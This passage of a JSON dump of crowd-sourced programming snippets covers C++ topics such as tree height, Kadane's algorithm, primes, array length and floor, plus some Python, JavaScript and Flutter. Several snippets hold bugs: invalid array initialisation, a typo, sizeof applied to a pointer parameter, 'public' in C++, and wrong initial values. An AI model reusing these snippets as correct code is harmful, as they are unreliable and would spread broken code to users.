    "description": "#include <iostream> using namespace std;  int main() {     int n1, n2;      cout << \"Enter two numbers: \";     cin >> n1 >> n2;          while(n1 != n2)     {         if(n1 > n2)             n1 -= n2;         else             n2 -= n1;     }      cout << \"HCF = \" << n1;     return 0; }\n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2034,
    "keyword": null,
    "link": null,
    "title": " find height of a tree",
    "description": "int height(Node* root) {     // Base case: empty tree has height 0     if (root == nullptr)         return 0;       // recur for left and right subtree and consider maximum depth     return 1 + max(height(root->left), height(root->right)); } \n// finding height of a binary tree in c++. int maxDepth(node* node)   {       if (node == NULL)           return 0;       else     {           /* compute the depth of each subtree */         int lDepth = maxDepth(node->left);           int rDepth = maxDepth(node->right);                  /* use the larger one */         if (lDepth > rDepth)               return(lDepth + 1);           else return(rDepth + 1);       }   }  \n",
    "reg_date": "2021-10-12T11:40:09.000Z"
  },
  {
    "id": 2035,
    "keyword": null,
    "link": null,
    "title": " find if c++ example",
    "description": "#include <iostream> #include <vector> #include <algorithm> using namespace std;  int main() {   vector<int> myvec {2, 5, 6, 10, 56, 7, 48, 89};   vector<int>::iterator gt10 = find_if(myvec.begin(), myvec.end(), [](int x){return x>10;}); // >= C++11   cout << \"First item >   10: \" << *gt10  << endl;        //check if pointer points to myvec.end()   if(gt10 != myvec.end()) {     cout << \"nf points to: \" << *gt10 << endl;   }   else {     cout << \"item not found\" << endl;   }    return 0; } \n",
    "reg_date": "2021-10-12T11:40:10.000Z"
  },
  {
    "id": 2036,
    "keyword": null,
    "link": null,
    "title": " find in set of pairs using first value cpp",
    "description": "auto it = std::find_if(st.begin(), st.end(), [](const pair<int,int>& p ){ return p.first == 1; });\n",
    "reg_date": "2021-10-12T11:40:10.000Z"
  },
  {
    "id": 2037,
    "keyword": null,
    "link": null,
    "title": " find kth max and min element in an array",
    "description": "#include <bits/stdc++.h>  using namespace std;  int main(){   \tconst int size = 10;   \tint k = 3; //Can be any number smalled than size \tint array[size] = {5,2,8,34,73,82,1,6,19,29}; \tsort(array,array+size); \tint smallestKthElement = array[k-1];\t \tint largestKthElement = array[size-k]; }\ndef divideAndConquer_Max(arr, ind, len): \tmaximum = -1;  \tif (ind >= len - 2): \t\tif (arr[ind] > arr[ind + 1]): \t\t\treturn arr[ind]; \t\telse: \t\t\treturn arr[ind + 1];   \tmaximum = divideAndConquer_Max(arr, ind + 1, len);  \tif (arr[ind] > maximum): \t\treturn arr[ind]; \telse: \t\treturn maximum;   def divideAndConquer_Min(arr, ind, len): \tminimum = 0; \tif (ind >= len - 2): \t\tif (arr[ind] < arr[ind + 1]): \t\t\treturn arr[ind]; \t\telse: \t\t\treturn arr[ind + 1];  \tminimum = divideAndConquer_Min(arr, ind + 1, len);  \tif (arr[ind] < minimum): \t\treturn arr[ind]; \telse: \t\treturn minimum;   if __name__ == '__main__':  \tminimum, maximum = 0, -1;  \t# array initialization \tarr = [6, 4, 8, 90, 12, 56, 7, 1, 63];  \tmaximum = divideAndConquer_Max(arr, 0, 9); \tminimum = divideAndConquer_Min(arr, 0, 9);  \tprint(\"The minimum number in the array is: \", minimum); \tprint(\"The maximum number in the array is: \", maximum);\n function nthlargest(arra,highest){ \t\t\tvar x = 0, \t\t\t\ty = 0, \t\t\t\tz = 0, \t\t\t\ttemp = 0, \t\t\t\ttnum = arra.length,  \t\t\t\tflag = false,  \t\t\t\tresult = false;      \t\t\twhile(x < tnum){ \t\t\t\ty = x + 1;  \t\t\t\t \t\t\t\tif(y < tnum){ \t\t\t\t\tfor(z = y; z < tnum; z++){ \t\t\t\t\t\t \t\t\t\t\t\tif(arra[x] < arra[z]){ \t\t\t\t\t\t\ttemp = arra[z]; \t\t\t\t\t\t\tarra[z] = arra[x]; \t\t\t\t\t\t\tarra[x] = temp; \t\t\t\t\t\t\tflag = true;  \t\t\t\t\t\t}else{ \t\t\t\t\t\t\tcontinue; \t\t\t\t\t\t}\t \t\t\t\t\t}\t\t\t\t\t \t\t\t\t} \t\t\t\t \t\t\t\tif(flag){ \t\t\t\t\tflag = false; \t\t\t\t}else{ \t\t\t\t\tx++;  \t\t\t\t\tif(x === highest){                         \t\t\t\t\t\tresult = true; \t\t\t\t\t}\t \t\t\t\t} \t\t\t\tif(result){ \t\t\t\t\tbreak; \t\t\t\t} \t\t\t}  \t\t\treturn (arra[(highest - 1)]);\t \t\t} \t\t console.log(nthlargest([ 43, 56, 23, 89, 88, 90, 99, 652], 4));   \n",
    "reg_date": "2021-10-12T11:40:10.000Z"
  },
  {
    "id": 2038,
    "keyword": null,
    "link": null,
    "title": " find largest and smallest number in c++",
    "description": "#include <iostream> using namespace std;  int main() { \tint again, num, smallest = 0, largest = 0; \t \tcout << \"Enter a positive number (program will execute at \\\"0\\\"): \"; \t \tdo \t{ \t\tcin >> num; \t\tif (num < 0) \t\t{ \t\t\tcout << \"Wrong Attempt! You have entered a negative number\" << endl; \t\t\tcout << \"Enter a positive number: \"; \t\t} \t\tif (num <= smallest) \t\t\tsmallest = num; \t\tif (num >= largest) \t\t\tlargest = num; \t} while (num != 0); \tcout << \"Smallest number: \" << smallest << endl; \tcout << \"Largest number: \" << largest << endl;  \treturn 0; }\n",
    "reg_date": "2021-10-12T11:40:10.000Z"
  },
  {
    "id": 2039,
    "keyword": null,
    "link": null,
    "title": " find last digit of number",
    "description": "int n; cout<<\"Enter the number\"; cin>>n; int LD= n % 10; cout<<LD<<endl;\n//C++ int last_digit = number % 10;\n",
    "reg_date": "2021-10-12T11:40:10.000Z"
  },
  {
    "id": 2040,
    "keyword": null,
    "link": null,
    "title": " find last element of an array c++",
    "description": "int arr={1,2,3,4,5,6}; int length=sizeof(arr)/sizeof(int); int lastElement=aar[length-1];\n",
    "reg_date": "2021-10-12T11:40:10.000Z"
  },
  {
    "id": 2041,
    "keyword": null,
    "link": null,
    "title": " find last occurrence of character in string c++",
    "description": "// Example YourStr.substr(YourStr.length() - 1)  // Syntax std::string YourStr = \"abcdef\"; std::cout << YourStr.substr(YourStr.length() - 1) << \"\\n\"; // OUTPUT: f\nauto find_char = 'a' size_t last_occurence_index = str.find_last_of(find_char);\nString[strlen(String) - 1]; \n",
    "reg_date": "2021-10-12T11:40:10.000Z"
  },
  {
    "id": 2042,
    "keyword": null,
    "link": null,
    "title": " find length of array c++",
    "description": "int arr[5]; int len = sizeof(arr) / sizeof(arr[0]); // returns 5\n#include <iostream> using namespace std; int main() {    int arr[5] = {4, 1, 8, 2, 9};    int len = sizeof(arr)/sizeof(arr[0]);    cout << \"The length of the array is: \" << len;    return 0; }\n#include <iostream> using namespace std;  #define size(type) ((char *)(&type+1)-(char*)(&type))  int main(){   int arr[5] = {1, 2, 3, 4, 5};   cout << size(arr) / size(arr[0]) << endl; //returns 5   //alternatively   cout << sizeof(arr) / sizeof(int) << endl; //returns 5 }\nint size = sizeof(arr)/sizeof(arr[0])\n// array::size #include <iostream> #include <array>  int main () {   std::array<int,5> myints;   std::cout << \"size of myints: \" << myints.size() << std::endl;   std::cout << \"sizeof(myints): \" << sizeof(myints) << std::endl;    return 0; }\nHow do I find the length of an array? //Method 1: - use sizeof(arr)/sizeof(*arr)   //Method 2:  - use std::array from  C++11 array <int,6> arr{1, 2, 3, 4, 5, 6};  cout << arr.size(); \n",
    "reg_date": "2021-10-12T11:40:10.000Z"
  },
  {
    "id": 2043,
    "keyword": null,
    "link": null,
    "title": " find max value in array c++",
    "description": "    int a = 1;     int b = 2;     int c = 3;      int m = std::max({a, b, c});\n#include<iostream>  using namespace std;  public void getMax_MinValue(int arr[]) {     int max, min;      max = arr[0];     min = arr[0];     for (int i = 0; i < sizeof(arr); i++)     {         if (max < arr[i])             max = arr[i];         else if (min > arr[i])             min = arr[i];     }      cout << \"Largest element : \" << max;     cout << \"Smallest element : \" << min;   }\ncout << \" max element is: \" << *max_element(array , array + n) << endl;\n*max_element (first_index, last_index); ex:- for an array arr of size n *max_element(arr, arr + n);\n#include <iostream> using namespace std; int main(){    //n is the number of elements in the array    int n, largest;    int num[50];    cout<<\"Enter number of elements you want to enter: \";    cin>>n;        /* Loop runs from o to n, in such a way that first     * element entered by user is stored in num[0], second      * in num[1] and so on.      */    for(int i = 0; i < n; i++) {       cout<<\"Enter Element \"<<(i+1)<< \": \";       cin>>num[i];    }    // Storing first array element in \"largest\" variable    largest = num[0];    for(int i = 1;i < n; i++) {       /* We are comparing largest variable with every element        * of array. If there is an element which is greater than        * largest variable value then we are copying that variable        * to largest, this way we have the largest element copied        * to the variable named \"largest\" at the end of the loop         *        */       if(largest < num[i])          largest = num[i];    }     cout<<\"Largest element in array is: \"<<largest;    return 0; }\n---without sort method--- public static int maxValue( int[]  n ) {  int max = Integer.MIN_VALUE;  for(int each: n)  if(each > max)  max = each;    return max;    ---with sort method--- public static int maxValue( int[]  n ) {  Arrays.sort( n );  return  n [ n.lenth-1 ];  }\n",
    "reg_date": "2021-10-12T11:40:10.000Z"
  },
  {
    "id": 2044,
    "keyword": null,
    "link": null,
    "title": " find maximum and second maximum number in array",
    "description": "#include <stdio.h> int main() {     int i, n;     float arr[100];     printf(\"Enter the number of elements (1 to 100): \");     scanf(\"%d\", &n);      for (i = 0; i < n; ++i) {         printf(\"Enter number%d: \", i + 1);         scanf(\"%f\", &arr[i]);     }      // storing the largest number to arr[0]     for (i = 1; i < n; ++i) {         if (arr[0] < arr[i])             arr[0] = arr[i];     }      printf(\"Largest element = %.2f\", arr[0]);      return 0; } \n#include <iostream> int main() {     std::cout << \"Enter 5 numbers : \";     int arr[5];          for (int i = 0; i < 5; std::cin >> arr[i++]);      int max = arr[0], second = 0;      for (int i = 1; i < 5; i++)         if (arr[i] > max)             max = arr[i];     std::cout << \"Maximum number : \" << max << \"\\n\";     bool found = false;     for (int i = 0; i < 5; i++)     {         if (arr[i] == max)             continue;         else if (arr[i] > second)         {             second = arr[i];             found = true;         }     }     if (found)         std::cout << \"Second maximum numbers : \" << second;     else         std::cout << \"Second maximum number not found.\"; }\n",
    "reg_date": "2021-10-12T11:40:10.000Z"
  },
  {
    "id": 2045,
    "keyword": null,
    "link": null,
    "title": " find maximum contiguous Sub arrays",
    "description": "#include <iostream> using namespace std; int main(){     int n;     cin >> n;     int arr[n];     for(int i =0;i< n;i++){         cin >> arr[i];     }          for (int i = 0; i < n; i++)     {         for (int j = i; j < n; j++)         {             for (int k = i; k <= j; k++)             {                 cout << arr[k] << \" \";             }             cout << endl;         }              }           return 0; }\n",
    "reg_date": "2021-10-12T11:40:11.000Z"
  },
  {
    "id": 2046,
    "keyword": null,
    "link": null,
    "title": " find maximum sum in array of contiguous subarrays",
    "description": "def max_length(s, k):     current = []     max_len = -1 # returns -1 if there is no subsequence that adds up to k.     for i in s:         current.append(i)         while sum(current) > k: # Shrink the array from the left, until the sum is <= k.            current = current[1:]         if sum(current) == k:             max_len = max(max_len, len(current))      return max_len\n#include <iostream>  using namespace std;  int main(){     //Input Array     int n;     cin >> n;     int arr[n];     for(int i =0;i< n;i++){     cin >> arr[i];     }      int currentSum = 0;     int maxSum = INT_MIN;     //algo     for (int i = 0; i < n; i++)     {         currentSum += arr[i];         if (currentSum <0)         {             currentSum = 0;         }         maxSum = max(maxSum, currentSum);     }     cout << maxSum << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:40:11.000Z"
  },
  {
    "id": 2047,
    "keyword": null,
    "link": null,
    "title": " find maximum sum of circular subarray",
    "description": "#include <iostream>  using namespace std;  int kadane(int arr[], int n) {     int currentSum = 0;     int maxSum = INT_MIN;     for (int i = 0; i < n; i++)     {         currentSum += arr[i];         if (currentSum < 0)         {             currentSum = 0;         }         maxSum = max(maxSum, currentSum);     }      return maxSum; } int main() {     //Input Array     int n;     cin >> n;     int arr[n];     for (int i = 0; i < n; i++)     {         cin >> arr[i];     }      int wrapsum, totalsum = 0;     int nonwrapsum;      nonwrapsum = kadane(arr, n);      for (int i = 0; i < n; i++)     {         totalsum += arr[i];         arr[i] = -arr[i];     }     wrapsum = totalsum + kadane(arr, n);     cout << max(wrapsum, nonwrapsum) << endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:40:11.000Z"
  },
  {
    "id": 2048,
    "keyword": null,
    "link": null,
    "title": " find min and max in array c++",
    "description": "#include<iostream>  using namespace std;  public void getMax_MinValue(int arr[]) {     int max, min;      max = arr[0];     min = arr[0];     for (int i = 0; i < sizeof(arr); i++)     {         if (max < arr[i])             max = arr[i];         else if (min > arr[i])             min = arr[i];     }      cout << \"Largest element : \" << max;     cout << \"Smallest element : \" << min;   }\n",
    "reg_date": "2021-10-12T11:40:11.000Z"
  },
  {
    "id": 2049,
    "keyword": null,
    "link": null,
    "title": " find mod in cpp",
    "description": "// \tMode(%) => to get remainder \t1 % 10 = 1  \t2 % 10 = 2     10 % 10 = 0       \n",
    "reg_date": "2021-10-12T11:40:11.000Z"
  },
  {
    "id": 2050,
    "keyword": null,
    "link": null,
    "title": " find number of 1s in a binary cv::mat image",
    "description": "#include <opencv2/core/core.hpp> #include <opencv2/imgproc/imgproc.hpp> #include <opencv2/highgui/highgui.hpp> #include <iostream> #include <features2d.hpp> using namespace cv; using namespace std; int main(int argc, char *argv[]) {     //load image     Mat img = imread(\"kayu.jpg\", CV_LOAD_IMAGE_COLOR);     if(img.empty())        return -1;     //namedWindow( \"kayu\", CV_WINDOW_AUTOSIZE );     imshow(\"kayu\", img);      //convert to b/w     Mat bw;     cvtColor(img, bw, CV_BGR2GRAY);     imshow(\"bw1\", bw);      threshold(bw, bw, 40, 255, CV_THRESH_BINARY);     imshow(\"bw\", bw);      //distance transform & normalisasi     Mat dist;     distanceTransform(bw, dist, CV_DIST_L2, 3);     normalize(dist, dist, 0, 2., NORM_MINMAX);     imshow(\"dist\", dist);      //threshold to draw line     threshold(dist, dist, .5, 1., CV_THRESH_BINARY);     imshow(\"dist2\", dist);      //dist = bw;     //dilasi     Mat dilation, erotion, element;     int dilation_type = MORPH_ELLIPSE;     int dilation_size = 17;      element = getStructuringElement(dilation_type, Size(2*dilation_size + 1, 2*dilation_size+1), Point(dilation_size, dilation_size ));     erode(dist, erotion, element);     int erotionCount = 0;     for(int i=0; i<erotionCount; i++){         erode(erotion, erotion, element);     }     imshow(\"erotion\", erotion);      dilate(erotion, dilation, element);     imshow(\"dilation\", dilation);     waitKey(0);     return 0; }\n",
    "reg_date": "2021-10-12T11:40:11.000Z"
  },
  {
    "id": 2051,
    "keyword": null,
    "link": null,
    "title": " find pair in unsorted array which gives sum x",
    "description": "// C++ program to check if given array  // has 2 elements whose sum is equal  // to the given value     #include <bits/stdc++.h>  using namespace std;     // Function to check if array has 2 elements  // whose sum is equal to the given value  bool hasArrayTwoCandidates(int A[], int arr_size,                             int sum)  {      int l, r;         /* Sort the elements */     sort(A, A + arr_size);         /* Now look for the two candidates in          the sorted array*/     l = 0;      r = arr_size - 1;      while (l < r) {          if (A[l] + A[r] == sum)              return 1;          else if (A[l] + A[r] < sum)              l++;          else // A[i] + A[j] > sum              r--;      }      return 0;  }     /* Driver program to test above function */ int main()  {      int A[] = { 1, 4, 45, 6, 10, -8 };      int n = 16;      int arr_size = sizeof(A) / sizeof(A[0]);         // Function calling      if (hasArrayTwoCandidates(A, arr_size, n))          cout << \"Array has two elements with given sum\";      else         cout << \"Array doesn't have two elements with given sum\";         return 0;  } \n",
    "reg_date": "2021-10-12T11:40:11.000Z"
  },
  {
    "id": 2052,
    "keyword": null,
    "link": null,
    "title": " find permutations",
    "description": "void permute(string a, int l, int r)   {       // Base case       if (l == r)           cout<<a<<endl;       else     {           // Permutations made           for (int i = l; i <= r; i++)           {                  // Swapping done               swap(a[l], a[i]);                  // Recursion called               permute(a, l+1, r);                  //backtrack               swap(a[l], a[i]);           }       }   }  \nvoid find_permutations(vector<int> &array, size_t index, vector<int> current_perm, vector<vector<int>> &res){     if(index == array.size())          res.push_back(current_perm);     else{         for(size_t i = 0; i <= current_perm.size(); ++i){             vector<int> new_perm(current_perm.begin(), current_perm.end());             new_perm.insert(new_perm.begin()+i, array[index]);             find_permutations(array, index+1, new_perm, res);         }     } }\nABC ACB BAC BCA CBA CAB\n",
    "reg_date": "2021-10-12T11:40:11.000Z"
  },
  {
    "id": 2053,
    "keyword": null,
    "link": null,
    "title": " find substring in string c++",
    "description": "std::string parentstring = \"Hello Agnosticdev, I love Tutorials\"; std::string substring = \"Agnosticdev\"; auto index = parentstring.find(substring);\n",
    "reg_date": "2021-10-12T11:40:11.000Z"
  },
  {
    "id": 2054,
    "keyword": null,
    "link": null,
    "title": " find the biggest number from 3 numbers c++",
    "description": "#include <iostream> using namespace std;  int main() {         float n1, n2, n3;      cout << \"Enter three numbers: \";     cin >> n1 >> n2 >> n3;      if(n1 >= n2 && n1 >= n3)         cout << \"Largest number: \" << n1;      if(n2 >= n1 && n2 >= n3)         cout << \"Largest number: \" << n2;          if(n3 >= n1 && n3 >= n2)         cout << \"Largest number: \" << n3;        return 0; }\n",
    "reg_date": "2021-10-12T11:40:11.000Z"
  },
  {
    "id": 2055,
    "keyword": null,
    "link": null,
    "title": " find the graph is minimal spanig tree or not",
    "description": "#include <iostream> #include <vector> #include <utility> #include <algorithm>  using namespace std; const int MAX = 1e4 + 5; int id[MAX], nodes, edges; pair <long long, pair<int, int> > p[MAX];  void initialize() {     for(int i = 0;i < MAX;++i)         id[i] = i; }  int root(int x) {     while(id[x] != x)     {         id[x] = id[id[x]];         x = id[x];     }     return x; }  void union1(int x, int y) {     int p = root(x);     int q = root(y);     id[p] = id[q]; }  long long kruskal(pair<long long, pair<int, int> > p[]) {     int x, y;     long long cost, minimumCost = 0;     for(int i = 0;i < edges;++i)     {         // Selecting edges one by one in increasing order from the beginning         x = p[i].second.first;         y = p[i].second.second;         cost = p[i].first;         // Check if the selected edge is creating a cycle or not         if(root(x) != root(y))         {             minimumCost += cost;             union1(x, y);         }         }     return minimumCost; }  int main() {     int x, y;     long long weight, cost, minimumCost;     initialize();     cin >> nodes >> edges;     for(int i = 0;i < edges;++i)     {         cin >> x >> y >> weight;         p[i] = make_pair(weight, make_pair(x, y));     }     // Sort the edges in the ascending order     sort(p, p + edges);     minimumCost = kruskal(p);     cout << minimumCost << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:40:12.000Z"
  },
  {
    "id": 2056,
    "keyword": null,
    "link": null,
    "title": " find vector push back in c++",
    "description": "//Let us say we have a vector v with elements {1, 2, 3, 4} //To pushback 5 v.push_back(5);\n",
    "reg_date": "2021-10-12T11:40:12.000Z"
  },
  {
    "id": 2057,
    "keyword": null,
    "link": null,
    "title": " find vector size in c++",
    "description": "#include <vector>  int main() {   std::vector<int> myVector = { 666, 1337, 420 };      size_t size = myVector.size(); // 3      myVector.push_back(399); // Add 399 to the end of the vector      size = myVector.size(); // 4 }\nvector<int> a; //to directly find the size of the vector; //use  a.size(;  cout <<\" \" << a.size();\nvectorName.size();\n",
    "reg_date": "2021-10-12T11:40:12.000Z"
  },
  {
    "id": 2058,
    "keyword": null,
    "link": null,
    "title": " finding all values of the mathematical expression",
    "description": "#define vi vector<int>  vi evaluate_expressions(unordered_map<string, vi> &umap, string s){     if(umap.find(s) != umap.end()) return umap[s];          vi res = {};      if(s.find('+') == string::npos and s.find('-') == string::npos and s.find('*') == string::npos)         res.push_back(stoi(s));      else{         for(size_t i = 0; i < s.size(); ++i){             char c = s[i];             if(c < 48){                 vi left = evaluate_expressions(umap, s.substr(0,i));                 vi right  = evaluate_expressions(umap, s.substr(i+1));                 for(int &l: left){                     for(int &r: right){                         if(c == '+')                             res.push_back(l+r);                         else if(c == '-')                             res.push_back(l-r);                         else if(c == '*')                             res.push_back(l*r);                     }                 }             }         }     }     umap[s] = res;     return res; }\n",
    "reg_date": "2021-10-12T11:40:12.000Z"
  },
  {
    "id": 2059,
    "keyword": null,
    "link": null,
    "title": " finding no of unique characters in a string c++",
    "description": "int countDistinct(string s)  {       unordered_map<char, int> m;       for (int i = 0; i < s.length(); i++) {          m[s[i]]++;      }       return m.size();  } \n",
    "reg_date": "2021-10-12T11:40:12.000Z"
  },
  {
    "id": 2060,
    "keyword": null,
    "link": null,
    "title": " finding the size of vector in c++",
    "description": "vector<int> a; //to directly find the size of the vector; //use  a.size(;  cout <<\" \" << a.size();\n",
    "reg_date": "2021-10-12T11:40:12.000Z"
  },
  {
    "id": 2061,
    "keyword": null,
    "link": null,
    "title": " finding unique BSTs",
    "description": "#define vN vector<Node *>  class Node{ public:     long val = 0;     Node *left = nullptr, *right = nullptr;     Node(int val_): val(val_){} };  vN find_unique_BSTs(long start, long end){     vN res = {};      if(start > end){         res.push_back(nullptr);         return res;     }      for(long i = start; i <= end; ++i){         vN left = find_unique_BSTs(start, i-1);         vN right = find_unique_BSTs(i+1, end);         for(Node *l: left){             for(Node *r: right){                 Node *root = new Node(i);                 root->left = l;                 root->right = r;                 res.push_back(root);             }         }     }     return res; }  vN res = find_unique_BSTs(1,n);\n",
    "reg_date": "2021-10-12T11:40:12.000Z"
  },
  {
    "id": 2062,
    "keyword": null,
    "link": null,
    "title": " findung the mode in c++",
    "description": "int number = array[0]; int mode = number; int count = 1; int countMode = 1;  for (int i=1; i<size; i++) {       if (array[i] == number)        { // count occurrences of the current number          ++count;       }       else       { // now this is a different number             if (count > countMode)              {                   countMode = count; // mode is the biggest ocurrences                   mode = number;             }            count = 1; // reset count for the new number            number = array[i];   } }  cout << \"mode : \" << mode << endl;\n",
    "reg_date": "2021-10-12T11:40:12.000Z"
  },
  {
    "id": 2063,
    "keyword": null,
    "link": null,
    "title": " first missing number leetcode",
    "description": " int firstMissingPositive(vector<int>& nums)      {         for(int i=0;i<nums.size();i++)             while(nums[i]>0 && nums[i]<=nums.size() && nums[nums[i]-1]!=nums[i])                 swap(nums[i],nums[nums[i]-1]);                  for(int i=0;i<nums.size();i++)             if(i+1!=nums[i])                 return i+1;                  return nums.size()+1;     }\n",
    "reg_date": "2021-10-12T11:40:12.000Z"
  },
  {
    "id": 2064,
    "keyword": null,
    "link": null,
    "title": " first negative number in window",
    "description": "//complexity O(n) #include <bits/stdc++.h>  using namespace std;  int main() {     int n;     cout<<\"Enter the size of the array:\"<<endl;     cin>>n;     int arr[n];     cout<<\"enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     int k;     cout<<\"enter the size of the window:\"<<endl;     cin>>k;     list<int>l;     vector<int>vec;     int i=0,j=0;     while(j<n)     {         if(arr[j]<0)         {             l.push_back(arr[j]);         }         if(j-i+1<k)         {             j++;         }         else if(j-i+1==k)         {             if(l.size()==0)             {                 vec.push_back(0);             }             else             {                 vec.push_back(l.front());                 if(arr[i]==l.front())                 {                     l.pop_front();                 }             }             i++;             j++;         }     }     for(auto it=vec.begin();it!=vec.end();it++)     {         cout<<*it<<\" \";     }       return 0; }  \n",
    "reg_date": "2021-10-12T11:40:13.000Z"
  },
  {
    "id": 2065,
    "keyword": null,
    "link": null,
    "title": " first prime numbers",
    "description": "#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \t//primes less than n \tint n; \tcin>>n; \tint primes=0,i=1; \twhile(primes++<n){ \t\twhile(!Is_Prime(++i)); \t\tcout<<i<<\" \"; \t} }\n#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \t//first n prime numbers \tint n; \tcin>>n; \tint i=1; \twhile(n--){ \t\twhile(!Is_Prime(++i)); \t\tcout<<i<<\" \"; \t} }\n",
    "reg_date": "2021-10-12T11:40:13.000Z"
  },
  {
    "id": 2066,
    "keyword": null,
    "link": null,
    "title": " first prime numbers less than",
    "description": "#include<bits/stdc++.h> using namespace std; bool Is_Prime(long long x){ \tif(x%2==0)return false; \tfor(int i=3;i*i<=x;i+=2) \t\tif(x%i==0)return false; \treturn true; } int main(){ \t//primes less than n \tint n; \tcin>>n; \tint primes=0,i=1; \twhile(primes++<n){ \t\twhile(!Is_Prime(++i)); \t\tcout<<i<<\" \"; \t} }\n",
    "reg_date": "2021-10-12T11:40:13.000Z"
  },
  {
    "id": 2067,
    "keyword": null,
    "link": null,
    "title": " fiunction in c++",
    "description": "// Create a function void myFunction() {   cout << \"I just got executed!\"; }  int main() {   myFunction(); // call the function   return 0; }  // Outputs \"I just got executed!\"\n",
    "reg_date": "2021-10-12T11:40:13.000Z"
  },
  {
    "id": 2068,
    "keyword": null,
    "link": null,
    "title": " five",
    "description": "1 5 \n",
    "reg_date": "2021-10-12T11:40:13.000Z"
  },
  {
    "id": 2069,
    "keyword": null,
    "link": null,
    "title": " flag controlled while loop c++",
    "description": "        a 0 1 2 3 4          b.    0 1 2 3 4 5          c.    1 2 3 4          d.    1 2 3 4 5          e.    0 0 0 . . . forever\n",
    "reg_date": "2021-10-12T11:40:13.000Z"
  },
  {
    "id": 2070,
    "keyword": null,
    "link": null,
    "title": " flags for g++ compiler",
    "description": "-std=C++11 -std=C++98 -o {filename} and so on...\n",
    "reg_date": "2021-10-12T11:40:13.000Z"
  },
  {
    "id": 2071,
    "keyword": null,
    "link": null,
    "title": " flags of open operation c++",
    "description": "in\tinput\tFile open for reading: the internal stream buffer supports input operations. out\toutput\tFile open for writing: the internal stream buffer supports output operations. binary\tbinary\tOperations are performed in binary mode rather than text. ate\tat end\tThe output position starts at the end of the file. app\tappend\tAll output operations happen at the end of the file, appending to its existing contents. trunc\ttruncate\tAny contents that existed in the file before it is open are discarded.\n",
    "reg_date": "2021-10-12T11:40:13.000Z"
  },
  {
    "id": 2072,
    "keyword": null,
    "link": null,
    "title": " flake8 max line length",
    "description": "--max-line-length=100\n",
    "reg_date": "2021-10-12T11:40:13.000Z"
  },
  {
    "id": 2073,
    "keyword": null,
    "link": null,
    "title": " flipperRSocketResponder.cpp command failed react native",
    "description": "# use_flipper!({ 'Flipper-Folly' => '2.5.1' }) \n",
    "reg_date": "2021-10-12T11:40:13.000Z"
  },
  {
    "id": 2074,
    "keyword": null,
    "link": null,
    "title": " float in c++",
    "description": "public float whatYourFloatIsCalled = 0; public float whatIsYourFloat;\nfloat contains less storage than a double.  float p = 25.0; double p = 25.0;\n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2075,
    "keyword": null,
    "link": null,
    "title": " float to byte array and back c++ with memcpy command",
    "description": "void float2Bytes(float val,byte* bytes_array){   // Create union of shared memory space   union {     float float_variable;     byte temp_array[4];   } u;   // Overite bytes of union with float variable   u.float_variable = val;   // Assign bytes to input array   memcpy(bytes_array, u.temp_array, 4); } \n// simply this line works perfectly, donnt know why union is taken??? memcpy(c_arr, &f, 4);\n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2076,
    "keyword": null,
    "link": null,
    "title": " floor",
    "description": "console.log(Math.floor(5.95)); // expected output: 5  console.log(Math.floor(5.05)); // expected output: 5  console.log(Math.floor(5)); // expected output: 5  console.log(Math.floor(-5.05)); // expected output: -6\n#include <iostream> #include <cmath>  using namespace std;  int main() {     int x = 15;     double result;     result = floor(x);     cout << \"Floor of \" << x << \" = \" << result << endl;      return 0; } \nMath.floor(1.6);  result: 1\n function myArrayMax(arr) {      return Math.max.apply(null, arr); }  \n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2077,
    "keyword": null,
    "link": null,
    "title": " floor divide c++",
    "description": "#include<iostream>  int main() {   //Random float f;   float f = 12.33;      //Getting the floor value of f which is the the whole number part.   //This will return an int.   int result = std::floor(f);      //Printing the answer to the screen.   std::cout << result << std::endl;      //The result should be: 12.      //exiting.   return 0; }\n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2078,
    "keyword": null,
    "link": null,
    "title": " floor in c++",
    "description": "floor(x):This function in C++ returns the largest possible integer value which is smaller than or equal to the given argument. Input : 2.5 ,-2.1 ,2.9 Output : 2 ,-3, 2\n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2079,
    "keyword": null,
    "link": null,
    "title": " floyd-Triangle in c++",
    "description": "#include<iostream> using namespace std;  int main(){     int num, count = 1;     cin>> num;      for (int i = 1; i <= num; i++)     {         for (int j = 1; j <= i ; j++)         {             cout << count << \" \";             count ++;         }             cout << endl;              }          return 0; }\n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2080,
    "keyword": null,
    "link": null,
    "title": " flutter RaisedButton with icon",
    "description": "// JZ Container(                   height: 25.0,                   padding: EdgeInsets.only(left: 10.0),                   child: RaisedButton.icon(                     color: Colors.white,                     label: Text(                       'Te amo, pero no eres para mi',                       style: TextStyle(fontSize: 13.0),                     ),                     icon: Icon(                       Icons.ac_unit_outlined,                       size: 13.0,                     ),                     onPressed: () {},                   ),                 )\nFlatButton.icon(onPressed: null, icon: null, label: null); RaisedButton.icon(onPressed: null, icon: null, label: null);\n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2081,
    "keyword": null,
    "link": null,
    "title": " flutter convert datetime in day of month",
    "description": "import 'package:intl/intl.dart';  DateTime now = DateTime.now(); String formattedDate = DateFormat('yyyy-MM-dd &ndash; kk:mm').format(now);\n",
    "reg_date": "2021-10-12T11:40:14.000Z"
  },
  {
    "id": 2082,
    "keyword": null,
    "link": null,
    "title": " flutter datetime format",
